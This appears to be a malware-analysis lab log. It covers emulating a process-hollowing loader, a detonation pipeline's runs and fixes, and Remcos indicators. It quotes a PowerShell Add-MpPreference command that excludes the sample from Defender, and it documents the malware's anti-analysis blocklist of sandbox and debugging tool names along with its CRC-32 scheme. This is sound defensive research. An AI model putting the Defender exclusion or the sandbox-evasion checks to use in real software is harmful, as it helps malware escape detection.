the standing detection note — `NtCreateFile` on `\??\ntdll.dll` from a hollowed
`RegSvcs` remains the cheap signal, and a monitor on Win32 or even on loaded-ntdll
entry points sees none of the anti-analysis either.

### Where it stops now: the process list is the gate, 10 Aug

Established by A/B on a single answer, everything else held identical:

- `SystemProcessInformation` answered `STATUS_NOT_IMPLEMENTED` — the payload **returns
  cleanly** at 377.4M blocks.
- answered `STATUS_SUCCESS` over the freshly-allocated, therefore zeroed, buffer — a
  structurally valid one-entry list — it runs **24M blocks further** and reaches
  `NtOpenDirectoryObject` → `NtCreateMutant` → `NtClose`.

So the next behaviour is a named-object single-instance check, and **the mutant's name
is an IOC** the moment that call is answered.

**It is left unimplemented on purpose, because it is a different kind of decision.**
Filling `Wow64Transition` restores something the kernel would have supplied.
Fabricating a process list invents a machine — and the payload is plausibly hunting
`explorer.exe`, which the decoded hash set already names, so whatever goes into that
list steers what happens next. A fabricated environment produces fabricated findings,
which is the same reason `backing()` answers end-of-file for a file the host does not
have rather than making bytes up. Decide it deliberately; the A/B above is the evidence
for what it buys.

**`RtlQueryEnvironmentVariable_U` is answered `STATUS_VARIABLE_NOT_FOUND` and the name
recorded**, for the same reason: this process has no environment block, and the
question is the finding whatever the answer is.

**An unhandled export corrupts the stack, and not where you find out about it.**
`RtlQueryEnvironmentVariable_U` going unhandled left three arguments on the stack and
the caller's own `ret` returned into them — surfacing as a fetch from address 0 **ten
million blocks downstream**, indistinguishable from a fresh mystery. The dispatcher now
says so at the moment it happens rather than only in the closing summary.

### Past the process list: a mutex, a blocklist, and a deliberate exit — 10 Aug

The list was built (`winenv.PROCESS_LIST`, twelve entries, `explorer.exe` among
them) and `NtQuerySystemInformation` class 5 answered properly, with
`STATUS_INFO_LENGTH_MISMATCH` and a required length when the buffer is short,
because that is how every enumeration sizes its buffer. It moved.

**It creates a single-instance mutex** — behaviour nine detonations never
reached, since they die well before this:

    422,934,337blk  NtOpenDirectoryObject('\BaseNamedObjects')
    424,698,950blk  NtCreateMutant('69971SRS6S-C1D59')

**That name is not an IOC, and an earlier revision of this section said it was.**
It is derived from the username, so what got published was a description of the
harness at the time — which was answering `RtlQueryEnvironmentVariable_U` with
`STATUS_VARIABLE_NOT_FOUND`. Two runs differing in nothing but `USERNAME`:

| `USERNAME` | mutant |
|---|---|
| *(unanswered)* | `69971SRS6S-C1D59` |
| `awhitfield` | `86L6NAB42YUD8CFZ` |
| `mrogers` | `KQ01PRT89EA08GMA` |

**What survives is the shape, and it is still worth having**: a 16-character
uppercase-alphanumeric mutant under `\BaseNamedObjects`, **derived per victim**.
Hunting the literal string is useless; hunting that shape, on a host where
`RegSvcs.exe` created it, is not.

**`KUSER_SHARED_DATA` was the next wall, and it is not a module.** Reading the
system time at `0x7ffe0018` faulted, because a harness that maps images does not
have the page every Windows process gets at `0x7FFE0000`. It is now **copied off
the host** rather than reconstructed — same reasoning as the export tables and
ntdll itself — with one deliberate exception: the tick count and system time are
**frozen**. A live clock would make two runs of one input produce different
memory and turn `test_emu_snapshot` into a coin flip. Note the trade, because it
is a behavioural change and not only a housekeeping one: *a sample that measures
elapsed time sees none pass.*

**Then it polls, and gives up.** Seven enumerations, `NtDelayExecution` between
them, then `ExitProcess` — 121 API calls, no fault anywhere.

**What it is looking for, measured.** It CRC-32s every enumerated image name,
lowercased, against **20 constants**; each constant is compared against all
twelve names and none matches. Cracking those constants needed the algorithm
first, and the algorithm was validated *against names the emulator was observed
hashing* rather than by whether it produced hits — a cracker checked only by
finding something will always find something. CRC-32, poly `0x04C11DB7`, init
`0xFFFFFFFF`, non-reflected, final NOT; it reproduces `explorer.exe`,
`lsass.exe`, `svchost.exe`, `regsvcs.exe` and `dwm.exe` exactly.

**Thirteen of the twenty:**

| | |
|---|---|
| Sysinternals / capture | `procmon.exe`, `regmon.exe`, `filemon.exe`, `wireshark.exe`, `netmon.exe` |
| Virtualisation | `vmwareuser.exe`, `vmwareservice.exe`, `vmsrvc.exe`, `vmusrvc.exe` |
| Sandbox | `sandboxiedcomlaunch.exe`, `sandboxierpcss.exe` |
| Analysis interpreters | `python.exe`, `perl.exe` — Cuckoo's agent is `python.exe` |

Seven are unrecovered and are recorded so the next attempt starts from them
rather than from scratch: `0x0263178b`, `0x0cc39fef`, `0x57585356`, `0x9cb95240`,
`0xa8d123c8`, `0xc72ce2d5`, `0xd0c58467`. Note what is *absent* — `vboxservice`,
`vboxtray`, `vmtoolsd`, `ollydbg`, `x64dbg`, `idaq`, `procexp`, `tcpview` were all
tried and none matches, so this is not simply the most common published list.

**This is a second, independent anti-analysis layer**, and it strengthens the
retraction of *Stage 3 carries no anti-analysis primitives* rather than repeating
it: the first layer asks the kernel about debuggers, this one enumerates
processes looking for tools. Neither leaves a string. **And it is a detection
opportunity the pipeline can use** — the guest runs Procmon, and `procmon.exe` is
the first name on that list.

**Why it exits, read rather than guessed.** Three theories were on the table —
the unanswered `USERNAME`, the frozen clock, the uncracked hashes — and testing
them one run at a time is inferring a cause from an indirect signal, which this
document has already paid for five times. `ExitProcess` is one call with one
call site, so it was read instead.

It is called from `0x202f064`, at the **tail** of its function, with exit code
**0**, immediately before `xor eax, eax ; mov esp, ebp ; pop ebp ; ret`, and the
frame chain above it is the ordinary one — `0x20309ac <- 0x401d2e <- 0x402a9f`,
the same outer frames as normal execution. **This is the main routine running to
its end, not an error path.** The sample did its checks, found nothing to act
on, and finished.

**And the blocklist is a blocklist — proven by serving a hit.** No preimage
guessing was needed: `procmon.exe` is one of the thirteen recovered, so adding it
to the served list puts a known match in front of the check. Everything else held
identical:

| | baseline | with `procmon.exe` present |
|---|---|---|
| Enumerations | 7 | **1** |
| Mutex created | `69971SRS6S-C1D59` | **none** |
| Stops at | 629,544,083 blocks | **396,459,486** |

A hit diverts it **233 million blocks earlier**, before the mutex is ever
created. So the table is an anti-analysis blocklist, and **its absence was never
the reason the baseline run stops** — that theory is dead, and the remaining
candidates for the clean exit are the `USERNAME` answer and the frozen clock.

**That measurement nearly did not mean anything.**
`system_process_information` binds `PROCESS_LIST` as a **default argument**, so
rebinding `winenv.PROCESS_LIST` changes nothing and the run would have reported
"a match makes no difference" — a confident negative produced by a patch that
never applied. The probe replaces the function and asserts the served bytes
contain the name before the result is allowed to count. *An A/B is only evidence
if the B actually happened.*

**Operationally, this one matters to the bench.** `procmon.exe` is on the list
and the guest runs Procmon during every detonation. It does **not** explain the
nine crashes — this check lives well past where those runs die — but it is now
measured rather than suspected that if the chain is ever carried past the crash,
Procmon's presence aborts the payload before it does anything worth observing.
Decide about renaming the binary before the next run, not after reading a quiet
report.

**One new gap, found by the same test:** on the bail path the harness faults at
`0x202621d` with an unmapped read. The blocklist-hit branch is therefore not
fully emulated, which matters only when that branch is the one being studied.

### The last two theories, both dead — 10 Aug

`USERNAME` is now answered from `winenv.ENVIRONMENT`, and the clock advances.

**The clock is virtual: neither frozen nor live.** It moves with blocks executed
(100ns each) plus every interval `NtDelayExecution` asks for, so elapsed-time
checks behave while two runs of one input still produce identical memory. A live
clock would have bought realism and cost `test_emu_snapshot`, which has caught
two real defects in a day. The value is recomputed absolutely from the block
count rather than accumulated, so a resumed snapshot lands on exactly what an
uninterrupted run would hold. A full run now reports **93s emulated, 30s of it
slept** — the three sleeps are 10s each.

**Neither changed anything.** 629,559,625 blocks against 629,544,083, the same
121 API calls, the same `ExitProcess`. So all three candidate explanations for
the exit are now eliminated: not the blocklist, not the environment, not the
clock. **The sample genuinely runs out of things to do** — which puts the seven
uncracked hashes back at the front, because whatever it polls seven times for is
most likely named among them.

**And answering `USERNAME` is what exposed the false IOC**, which is the more
useful half. The mutex name moved the moment the environment did. **No injection was reached** — `NtWriteVirtualMemory` was
never called, no process was opened, and stage 4 remains unrecovered. The
instrumentation for it is in place and idle: remote writes are copied out,
PE-tested and dumped, section views are allocated so the end-of-run scan can see
a payload copied into one by ordinary instructions, and `NtOpenProcess` refuses
any pid the served list did not contain, so the fiction stays self-consistent.

**And the *second* jump to address 0 is not a crash at all.** ESP was back above the
initial stack top and the unwind ended in `xor eax, eax ; mov esp, ebp ; pop ebp ; ret`
— the entry function returning and popping a zero, because nothing pushes a sentinel
return address onto the initial stack. Unicorn reports that as `UC_ERR_FETCH_UNMAPPED`,
identical to the real fault at the transition. `run()` now tells them apart **by ESP,
not by EIP**. A payload deciding to leave and a payload dying had been producing the
same line.

**Restorable state is on the artifact drive** so none of this needs rebuilding:
`warm400M.state` (in the marker scan), `after_scan.state` (at the syscall crash, and
still the one to load -- `repair_wow64_crash()` picks it up) and `warm60M.state`,
beside the samples in `G:\ringforge-artifacts\422e30ed_stage2\`. Restore is seconds;
`scripts/test_emu_snapshot.py` is the equivalence check that says a restore is sound,
and it reads a v1 snapshot as happily as a v2 one.

**Two harness facts that each cost a cycle and will cost the next person the same.**
`UC_X86_REG_FS_BASE` is a **no-op in 32-bit Unicorn** — it accepts the write, reports
no error, and `fs:[0x18]` still faults; FS needs a real GDT descriptor. And a guessed
export-name list is the wrong tool: a name that is not in it resolves to 0 and then
gets *called*, surfacing as `eip 0x0` a long way from the cause. Read the real export
names out of the host's own `SysWOW64\kernel32.dll` and `ntdll.dll` (1,665 and 2,517
names) — free, authoritative, and it removes the whole class of failure.

**A self-check that could not fail, caught by its own output — and then a second one
that could fail and was still pointed at the wrong thing.** The harness first compared
the earliest allocation snapshot against the *last snapshot*; with one snapshot those
are the same sample, so the verdict could only ever read `UNCHANGED`. Fixing that to
compare against the final state made the check *capable* of failing, and it still gave
a false answer, because the buffer it watched was not the one being written. **A check
that can fail is necessary and not sufficient; it also has to be aimed at the
subject.** Both revisions of this section were published before that was noticed.


**A rule that matches where the ruleset matched nothing.**
`tools\yara\local\ringforge_split_api_loader.yar` carries two rules: one on the
split-fragment technique, one on this build. Written `wide`-only, because these are
.NET user strings and `Alloc` and `Handle` also occur 42 and 63 times as *ascii*
inside the generated decoy names — an ascii-or-wide rule would match the padding
and say nothing. No `pe` module, so it works on a process dump.
`"kernel "`, `"32.dll"` and `"Virtual "` are all mandatory rather than counted,
because `"Open "` and `"Close "` in UTF-16 are ordinary UI text that any GUI
process's dump holds. Verified: every string fires on the carved image, and **0 of
120** genuine assemblies under `Microsoft.NET` and `Framework64` match. Not yet
scanned against a real memory dump, which is where a false positive would surface
— the next run puts it against ten to twelve.

### Stage 3 carries no anti-analysis primitives, 09 Aug

Run because gap 4's negative was explicitly weak *while the payload was encrypted*,
and it no longer is. This is the first search of material that was unreadable when
that caveat was written.

**Two searches, because one of them was the wrong tool.** 48 pipeline
`VM_ARTIFACT_MARKERS` plus 64 string tokens over hypervisors, sandboxes, debuggers,
analysis tools and WMI/identity, ascii and UTF-16 — and then, separately, the
*instructions*, because `rdtsc`, `cpuid`, `sidt`, `sgdt`, `sldt` and the VMware
backdoor `in` have **no string form at all** and a token search cannot see them. The
first pass listed `rdtsc` and `cpuid` as strings, which was meaningless.

| Region | Size | Result |
|---|---|---|
| Stage 3 headers | 4 KB | nothing |
| Stage 3 stub (plaintext code) | 6.8 KB | nothing but two `int3` |
| Stage 3 packed blob | 273 KB | **a negative here proves nothing** |
| Emulated allocation (partly unpacked) | 284 KB | nothing above chance |

The stub's only hit is `int3` at `0x40267e`/`0x40267f`, which is the alignment
padding immediately before the entry point at `0x402680`.

**The allocation's apparent hits are decode noise, and there is a control rather
than an assertion.** Linearly disassembling 284 KB of largely still-packed data
produces `in`, `int1` and `int3` constantly — they are one-byte opcodes. Running the
identical scan over the known-random packed blob and over `os.urandom` of the same
length puts every count at or below the baselines: `in` 1,265 against 1,951 and
1,823, `int1` 295 against 495 and 472, `cpuid` 3 against 4 and 2, `rdtsc` 2 against
0 and 1. **A signal that a random buffer reproduces is not a signal** — the same rule
as the carver's eleven unmapped images in an idle Python process.

**What it changes.** Gap 4's negative now covers stage 3's plaintext as well as stage
2's, so "anti-analysis explains the deterministic crash" is worse supported than it
was. It is still **not** conclusive: the 272 KB inner blob is packed and the
allocation only partly unpacked, so this is a stronger bounded negative, not a proof.

**What it does and does not settle for the emulator.** This search was run to choose
between *environment gap* and *anti-emulation bail* as explanations for what looked
like a stall in `emulate_native_stub.py`. The reasoning was sound and the premise was
not: single-stepping then showed there is no stall to explain. The search stands on its
own evidence — no anti-analysis primitive in anything readable — but nothing should be
inferred from it about a stall that does not exist.

### The 06 Aug 21:15 run — the guard held, the config did not, and the packer got away

`run_id 9e69fcbc`, 252s, 98,540 Procmon events, clean baseline
(`autoruns before_total: 1601`). The eighth run of this sample and the first with
the registry-read code on the guest.

**The code was there and the reads were not.** `vm_artifact_reads` is present and
reports `collection_available: false`, `reads_in_stream: 0`, with the note naming
`dynamic_registry_reads.pmc`; the report renders **Registry Reads — Not
Collected**. So gap 4b's *guard* is proven on a live run — a zero that would
otherwise have read as "the sample checked nothing" was refused — and its finding
path still is not.

**And the run could not say why, which is now fixed.** Two explanations fitted
equally: the config field was still on the default, or the generated config was
selected and Procmon ignored the rules added to it. The event mix is identical
under both. The summary recorded the dump offsets, the process cap and the
re-dump delay and said nothing about the filter, so `procmon_filter` now carries
the config path, its included operations and `captures_registry_reads`, read out
of the file rather than off the filename. It renders in Capture Configuration and
in the not-collected card, and a filter that cannot see reads is announced at
launch instead of after the teardown.

**The packer image got away, and the record was silent about that too.** Dormancy
was **+23s**. The root was dumped at +1s — 122 MB, 65 modules, `unmapped: 0` —
spawned `RegSvcs` at +23s, and was gone by +24s with the +25s offset never coming
due for it. `unmapped_images: 0`, `carved: 0`. The previous run's payload came
from that exact offset. The summary showed 9 dumps, 1 skip, 2 failures and
**nothing at all** about the missing image: `_record_root_never_dumped` returns
early once the root has any dump, which is what made it invisible. Now any
process that exits with scheduled offsets ahead of it records them by name.

**Which produced the better instrument.** Across eight runs this sample's dormancy
has been +20, +23, +24, +42, +48 and +60s, so the parent's useful window —
`[unpack, spawn + ~1s]` — moves by forty seconds and a fixed offset lands in it by
luck. **The parent is now imaged at the moment it spawns a child**, trigger
`parent-at-spawn`, suffix `_atspawn`. That instant is a property of the technique:
the loader has decrypted the next stage and is about to write it into the process
it just created. Once per parent, caps honoured, refusals recorded — and ordered
*before* the child's own dump, because the parent has about a second left while
the child's spawn image has been an empty shell on every run so far, and losing it
is recorded as a skip.

**Both of the previous run's fixes verified live.** `crashed_pid: 8428`,
`werfault_pid: 10096`, `spawned_by_pid: 8428` — three PIDs, correctly told apart.
And *What Each Dump Held* settled the question it was built for on its first
outing: the `RegSvcs` spawn dump shows `known_module: 0` alongside `unmapped: 0`,
so nothing was suppressed there and the zero is the real answer; the crash dump
shows `known_module: 2`, so its zero stays qualified. That was a deduction one run
ago.

Everything else held: 70 · Elevated Attention, `process_injection` **strong** on
the crash alone (`0 unmapped PE image(s)` contributed nothing this time),
`scripted_execution`, PowerShell 12/1, YARA 0 across 10 dumps,
`missed_descendants: 1` naming WerFault 10096, `chain_crashed` on both witnesses.

### The 06 Aug 20:23 run — void for gap 4b, and it moved gap 5

The seventh detonation of this sample, run against the prediction recorded below.
`run_id 253c1d72`, 311 seconds, 106,343 Procmon events, `capture_quality: good`.

**It tested none of what it was set up for.** Guest one commit behind and the
Procmon config field still on the default — see gap 4b for the two witnesses. The
registry-read collection path remains entirely unproven.

**What the prediction got right, exactly:** score **70 · Elevated Attention**,
`process_injection` **strong** by the crash route with `scripted_execution`
alongside; PowerShell `blocks_from_sample: 12`, `blocks_suspicious: 1`,
`other_process_blocks_excluded: 0`; `sysmon_injection_events: 0` with Event 25
silent again; `RegSvcs.exe` faulting `0xc0000005` at `012b521d` with no faulting
module, `crashes_in_hollowing_target: 1`.

**The chain-crashed warning fired on a live run for the first time.** Both
witnesses agreed, naming `RegSvcs.exe (pid 4264)`, and the card rendered above the
verdict. It had only ever been verified against recorded records before this.

**Three results worth keeping:**

- **The root was dumped at t1 and t25, and the payload is in the second.** The
  before/after pair, on the parent rather than a child — see gap 3. The carved
  image is `SmartOptimization.dll` again: 81,920 bytes, x86 .NET, `0x6a71514c` =
  2026-08-04, at `0x5320000` in `…_2448_t25.dmp`.
- **The known-module index held a second time, on a different chain shape.**
  `known_module_images: 9`, `resource_only_images: 22`, `rejected: 0`,
  `unmapped_in_hollowing_target: 0`. It was already proven at 15:55 with 6; this
  run had two `RegSvcs` rather than three and reclassified 9, with the
  six-copies-of-ntdll false positive still absent and the payload still reported.
  Suppress the system DLLs, keep the payload, which is exactly what it was for.
- **File-versus-mapped layout is proven too.** The payload reported
  `layout: "file"`, `truncated: false`, `regions_spanned: 1`. Held in file layout,
  measured against file layout, and reported complete. The multi-region carve
  still has not engaged — nothing spanned ranges.

**And one that contradicts the plan:** every `RegSvcs` image reported
`unmapped: 0`, including the full-memory crash dump. That is this document's own
written failure criterion for gap 5, and gap 5 now says so.

**Deltas from the previous six runs.** Dormancy **+48s**, so the spread is
+20, +24, +42, +48, +60 — still widening. **Two** `RegSvcs` this time rather than
three, and `missed_descendants: 0` against 3 on the 05 Aug run. The chain is
`sample → powershell.exe Add-MpPreference → RegSvcs.exe (4264, faults at +2.1s) →
WerFault.exe (7976)`, with a second `RegSvcs` (3420) at t51.

**One defect, cosmetic, and one worth watching:**

- `werfault_witnesses[].werfault_pid` reported **4264**, the crashed process's
  PID. WerFault was **7976**, in the spawn detail. The field was reading the
  record's own `pid`, which on a process-create event is the *creating* process —
  and because the crashing process is what spawns WerFault, the wrong value was
  the right number twice over. Fixed to read the created PID from the detail, with
  `spawned_by_pid` keeping the other question. `chain_crashed` and `crashed_pid`
  were always correct, so nothing downstream was wrong. The test fixture had
  encoded the same misunderstanding, which is why review would not have caught it.
- **The first Sysmon Event 8 this project has ever recorded — and it was ours.**
  `<unknown process> → dumpcap.exe`, correctly classified as analyzer activity and
  excluded, so `injection_events` stayed 0 for the sample. The exclusion did its
  job on the one occasion it has had.
- **WER's `192.0.2.123:443` landed in `sample_destinations`.** The smaller gap
  below, manifesting for real: `WerFault` is sample lineage, so its Windows Error
  Reporting upload attempt counts as the sample's traffic. It cost nothing — 443
  is a standard port and no domain was notable, so `external_contact` correctly
  did not fire — but it is no longer hypothetical. FakeNet's own table names
  `wermgr.exe` at the same address, which is the corroboration.

### The earlier 06 Aug re-run — the carver's finding path fired

**Gap 5's `strong` branch has now been exercised.** The carver reported
`unmapped_in_hollowing_target: 2` inside a hollowed `RegSvcs.exe`, so
`process_injection` reached strong by a route independent of the crash. On real
dumps it also set aside **14** resource-only images without a single false
positive, and rejected nothing.

**But the premise gap 3 was built on turns out to be wrong for this sample.**
The *spawn* dump — `RegSvcs.exe_10784_t20.dmp`, 15 MB — already contained both
unmapped images. Hollowing was complete before the watcher ever saw the child.
The re-dump never fired at all: all three children exited before +3s, and the
skip records say so. "Every `RegSvcs` image is a 15 MB empty shell" came from
runs where nothing was reading the images structurally — nobody could tell the
shell was not empty. The re-dump remains sound for a slower loader; it was never
needed here.

**Dormancy is now +20, +24, +42, +48, +60s** across seven runs. The spread keeps
widening, which was the argument for the re-dump — though on this chain the
re-dump is the wrong instrument regardless, because the children die in 2s. What
the spread really argues against is a *fixed offset* catching a child at all.

**The 1.8 MB images were `ntdll.dll`, and the finding was a false positive.**
Static analysis of the carved files settled it: sections `.text`, `RT`, `PAGE`,
`.mrdata`, `.00cfg`, no import table, and strings reading
`.text$lp00ntdll.dll!20_pri7` and `CLIENT(ntdll): Found CheckAppHelp`. So
`unmapped_in_hollowing_target: 6` was six copies of ntdll, and
`process_injection` reaching strong by the carver route on that run was not
earned. The crash route fired legitimately, so the verdict stood — for one
reason rather than two.

The cause is in the data: those dumps enumerate **6 and 11 modules** while the
loader's own dump enumerates **65**. A process created suspended — which is
exactly what hollowing does — has ntdll mapped before the loader has populated
its module list, so the DLL is physically present and legitimately absent from
the list the carver checks against. See *The known-module fix*.

The year-2081 timestamp was the tell, built in and then not read. Microsoft's
reproducible builds put a **hash** in `TimeDateStamp` rather than a build time,
so `0xd277d290` was never a date. The plausibility bound was the year 2100, so
it rendered as "2081-11-22" instead of as nothing.

### The payload, recovered and self-describing

The image that mattered was in the loader's *own* process, not in `RegSvcs`: an
81,920-byte x86 **.NET** PE, importing only `mscoree.dll`, written in VB.NET
(`Microsoft.VisualBasic.CompilerServices`). Its version resource:

| | |
|---|---|
| CompanyName | `Microsoft Corporation` |
| FileDescription | `Microsoft Smart Optimization` |
| OriginalFilename | `SmartOptimization.dll` |
| ProductName | `Smart Optimization` |
| FileVersion | `2025.2.0.14826` |
| LegalCopyright | `Copyright © Microsoft Corporation 2026` |
| TimeDateStamp | `0x6a71514c` — 2026-08-04, two days before the run |

**There is no Microsoft product called "Smart Optimization".** This is the
unpacked stage wearing forged Microsoft branding, and it is the first payload
this pipeline has recovered *and named* without anyone carving by hand.

**It reported 57,344 of 81,920 bytes and was complete all along.** Two theories
came and went before the right one. It was never a timing problem — a later dump
would not have helped — and it was not a split across memory ranges either,
though the carve now handles that case too. `SizeOfImage` is the **mapped**
footprint: what the loader spreads an image into once section boundaries are
rounded up to pages. This payload sits in memory in **file layout**, as a raw
blob, which is what `Assembly.Load(byte[])` and every decrypt-then-map loader
produces — precisely the state a dump of the *unpacking* process catches.

The evidence it was whole: 57,344 bytes matches the 05 Aug hand-carve exactly,
two extractions months and methods apart; `pefile` read the complete version
resource out of it, which a cut-off `.rsrc` would not have allowed; and the
section table sums to about 54 KB, which fits inside 57,344 with page padding
to spare.

So the carver now computes the file-layout size — the end of the last section's
raw data — and reports which shape it found: `layout: "file"` or `"mapped"`,
with `truncated` measured against whichever applies. **A payload in file layout
has not been mapped yet**, which is worth knowing on its own: it says where in
the chain the dump caught it.

The carve also follows an image across *virtually contiguous* ranges now, and
records `regions_spanned`. It deliberately stops at a gap: the rest was not
captured, and splicing the next range on would fabricate an artifact rather than
truncate one.

### The known-module fix

An image not covered by *this* dump's module list, but enumerated as a loaded
module by *any other* dump in the same run, is now classified `known_module` —
counted like `resource_only`, never scored, never carved.

Matched on `(TimeDateStamp, SizeOfImage)` rather than on a name. That pair
identifies a build, it is present both in a minidump's module list and in a
carved image's own header, and it needs no list of system DLLs to keep in step
with a Windows version. On the run that exposed this it would have reclassified
all six ntdll copies and left `SmartOptimization.dll` untouched — nothing
enumerates that anywhere.

It costs a first pass over the run's dumps to build the index, which is cheap:
the module list is a stream, not a scan.

`_iso_timestamp` now renders nothing for a date in the future rather than a
plausible-looking one, so a hash in `TimeDateStamp` reads as absent instead of as
2081.

### Three defects the run exposed, all fixed

1. **The carve failed on Windows' 260-character path limit.** Samples are stored
   under their SHA256, so `_carve_name` produced a 68-character process fragment;
   with the case id and a timestamped run id in the path that came to 264
   characters and failed with a bare `[Errno 2] No such file or directory`. The
   name fragment is now capped at 24 (264 → 220), and both the write and the
   `mkdir` go through a `\\?\` long-path form, because a deep enough case
   directory exceeds the limit whatever the image is called.
2. **`payload_dropped` reached strong on a sample that drops nothing.** Two
   libraries written by `msedgewebview2.exe` — not sample lineage at all —
   plus two `__PSScriptPolicyTest_*.ps1` files, which PowerShell writes on every
   invocation. `collect_dropped_file_candidates` had no lineage filter; the
   findings and the PowerShell blocks had been given one and dropped files were
   missed. It now takes `descendant_pids`, with `None` meaning "could not
   resolve, count everything" rather than an empty tree, and the policy-probe
   name is in the noise list.
3. **The crash-dump route silently downgraded itself.** WER writes
   `RegSvcs.10784.dmp`, and the collector recorded the bare stem `RegSvcs` —
   which is not in `HOLLOWING_TARGETS`, so the same carved image classified
   `hollowing_target: false` from a crash dump and `true` from a live one. The
   extension was already being computed there for the attribution test and then
   discarded. **This is the loader's historical case**: on the three earlier
   runs the crash dump was the *only* image of `RegSvcs`, so the finding would
   have been `present` where it should have been `strong`.

### The prediction that was recorded before it ran

**It has now been run against, and the scoring is in *The 06 Aug 20:23 run*
above.** Short version: everything predicted about the chain, the score and the
crash landed exactly; gap 3's re-dump prediction failed because the children die
inside 3s; gap 5's failed in the informative direction, which is what revised the
gap; and gap 4b's was never tested, because the run did not carry the code. Left
here unedited, because a prediction rewritten after the fact is worth nothing.

**That advice is superseded.** This section used to end "if you return to this
sample, the `.rsrc` blob is a static-analysis job, not another detonation." That
was correct when written: nothing in the pipeline would have seen anything new.
Two features have been built since that have never met it, and both were built
*for* this chain.

Recorded before the run, on the same principle as the Remcos section: an
expectation written in advance makes the detonation a pass/fail test of the
pipeline rather than a description of the sample.

**Why this sample and not a new one.** It is the only sample here that hollows a
binary in `HOLLOWING_TARGETS`, and its payload is mapped *alongside* the real
`RegSvcs.exe` image rather than over it — which is exactly what the carver can
see, the overwrite-in-place variant being the documented blind spot. The two PE
headers were already confirmed by hand: RegSvcs at `0x5ff2b99b`, the payload
carrying a 2025 one.

**Settings, and both differ from the Remcos runs:**

| Setting | Value | Why |
|---|---|---|
| `spawn_redump_seconds` | **3**, not 10 | The payload faults. At 10s the record reads `exited before its +10s re-dump` instead of producing an image. Hollowing completes in well under a second, so 3s is after the write and before the crash |
| Offsets | **1, 25** | Dormancy is 20–60s, so +1s catches the parent while it is still alive. **This worked**: t1 and t25 imaged the root and the payload is in the second — the pair, on the parent |
| Max processes | 20 | Six-process chain, plus re-dumps |
| Procmon config | **`dynamic_registry_reads.pmc`** | The only way a VM check is visible. Unproven with Procmon, so check `export.csv` has `RegQueryValue` rows before reading an empty result as "it did not look" |
| Window | 180s, and **untick *Extend if dormant*** | Do not shorten it for the reads: dormancy has reached +60s on this sample, and the other two gaps this run is for need the payload to actually start. The volume cost of the read config is paid in teardown instead — that is the right side to pay it on |

**What each gap should get:**

- **Gap 5, the finding path.** The carver should report `unmapped` inside
  `RegSvcs.exe`. Because `RegSvcs` is in `HOLLOWING_TARGETS` this fires
  **strong** — the branch that has never been exercised on any run. Expect the
  carved image to be an x86 .NET EXE of 57,344 bytes, compiled 2025-06-18.
  Compare its SHA256 against the hand-carved copy.
- **Gap 3, the revelation.** The spawn dump should catch `RegSvcs` as a ~15 MB
  empty shell and the +3s re-dump the same PID with the payload in it. A size or
  hash difference between the pair is the whole point of the feature and has
  never been seen.
- **Gap 2.** `sysmon_injection_events: 0` again, and Event 25 silent again. The
  crash route should fire `process_injection` **strong** as it did on 05 Aug.
- **Gap 4.** The chain-crashed warning should fire on both witnesses, as it did
  against this tree's recorded records. **And with
  `dynamic_registry_reads.pmc` selected as the Procmon config, the run answers the
  open question about this sample:** whether `RegSvcs.exe` reads
  `…\Services\VBoxGuest`, an ACPI table signed `VBOX__` or `SystemBiosVersion`
  before it faults. A deterministic fault six runs deep with a VM check in front
  of it is anti-analysis; the same fault with no check is a broken crypter. Either
  answer is the first real evidence. Watch two things that would make it a
  collection failure rather than a finding: `Operation` values in `export.csv`
  containing no `RegQueryValue` at all, which means Procmon did not accept the
  generated config, and a teardown much longer than the last run's, which is the
  volume cost landing.

**Expected, from three previous runs:** chain sample → `powershell.exe
Add-MpPreference -ExclusionPath <self>` → 3× `RegSvcs.exe` within 15 ms; one
faults `0xc0000005` in unmapped memory, the others die inside one poll interval;
12 PowerShell blocks with 1 suspicious; score 70 · Elevated Attention with
`process_injection` (strong) + `scripted_execution`.

**What would make it a failure rather than a finding:** the carver reporting
`unmapped_images: 0` on a dump of `RegSvcs` taken *after* the payload was
written. That would mean the payload is written over the host image at its
original base after all, and the 05 Aug hand-carve found it alongside only
because the crash dump caught a different moment.

**That answer was about the 57 KB image, and it is now superseded.** It said the
carved image is a SmartAssembly-protected reflective loader disguised as a puzzle
game with no config in it — all true — and then that "there is nothing more this
sample yields without defeating SmartAssembly, which is a reverse-engineering job
on stage 2."

**Stage 2 has since been recovered, and it is not SmartAssembly-protected.** The
07 Aug run's parent-at-spawn dump produced it, and it uses a different scheme
entirely. So the sample has yielded a great deal more, from a pipeline change
rather than from reverse engineering. See *The 892 KB stage* below for what it is
and what is left in it.

---

## Remcos reference data (`aa4d6427…`) — run 06 Aug

Recorded as a prediction before the run, which is why it was worth running: four
of the expectations held and three failed, and every one of the three failures
was a pipeline bug rather than a property of the sample. A run described only
afterwards would have read as a clean success.

**What the run produced:** 70 · Elevated Attention / High, 2 categories agreeing
(`packed_payload`, `persistence_installed` strong). After the four fixes below,
the same inputs score **105 · Likely Malicious**, 3 present and 2 strong.

| | |
|---|---|
| SHA256 | `aa4d642727be33ecd94acb8a24e546aeed325f08367333bb8974f5e54d99e715` |
| Family | Remcos RAT — HA reports `Gen:Variant.Rescoms`, which is Bitdefender's name for Remcos |
| Source | `hybrid-analysis.com/sample/aa4d6427…/6a4d71d9e17d51fadd07ca1a` · 100/100 · AV 75% |
| Type | Native PE32. **Not .NET** — deliberately a different shape from `422e30ed` |
| Chain | sample → creates a process **suspended** → writes into it → `%APPDATA%\Config\smng.exe` |
| Injection | `CreateProcess` suspended + write to remote process + `Set`/`GetThreadContext` |
| Dropped | `%APPDATA%\Config\smng.exe`, 18/24 vendors |
| Persistence | `HKCU\…\CurrentVersion\Run` **and** `HKLM\SOFTWARE\WOW6432Node\…\CurrentVersion\Run`, value `TRY150-6P1GV6` |
| C2 | `62.60.226.68:24042` |
| Other lookup | `pro.ip-api.com` (geolocation, `https://pro.ip-api.com/line/?key=…`) |
| IDS | `ET MALWARE Remcos 3.x Unencrypted Checkin/Server Response` |
| Outcome | No `WerFault` child. It completes — which is why it was chosen |

### Prediction against outcome

| Predicted | Outcome |
|---|---|
| Run keys in HKCU and HKLM\Wow6432Node, value `TRY150-6P1GV6` | **Exact.** Both, same value, same target |
| `persistence_installed` strong | **Held.** First time this category has fired on any run |
| Drop to `%APPDATA%\Config\smng.exe` | **The file was written; the pipeline did not see it.** Bug 1 |
| C2 `62.60.226.68:24042` | **Exact.** Attributed to `smng.exe` by the diverter |
| `external_contact` strong | **Failed.** Attribution worked and the category still did not fire. Bug 2 |
